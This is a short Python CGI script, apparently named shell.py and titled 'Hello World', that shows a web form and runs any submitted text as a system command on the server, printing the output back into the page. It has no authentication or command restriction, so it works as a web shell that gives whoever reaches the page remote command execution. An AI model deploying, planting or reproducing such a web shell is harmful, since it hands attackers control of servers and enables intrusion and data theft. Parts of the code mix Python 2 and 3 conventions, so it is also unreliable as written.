#!/usr/bin/env python

import cgi
import subprocess

import cgitb
cgitb.enable()

def run(command):
    if not command:
       raise Exception("Commande vide")
    else:
       p = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
       p.wait()
       out, err = p.communicate()
       return out

print ("Content-Type: text/html")
print()
print ("<html>")
print ("<head>")
print ("<title>Hello World</title>")
print ("</head>")
print ("<body>")
print ("<form method='post' action='shell.py'>")
print ("<input type='text' name='command' />")
print ("<input type='submit' value='submit' />")
print ("</form>")

form = cgi.FieldStorage()
if 'command' in form:
    cmd = form['command'].value
    print ("<font face='monospace'>")
    print ("$ %s" % cmd)
    print ("<br>")
    for i in run(cmd).split('\n'):
        print (i, "<br>")
    print ("</font>")

print ("</body>")
print ("</html>")

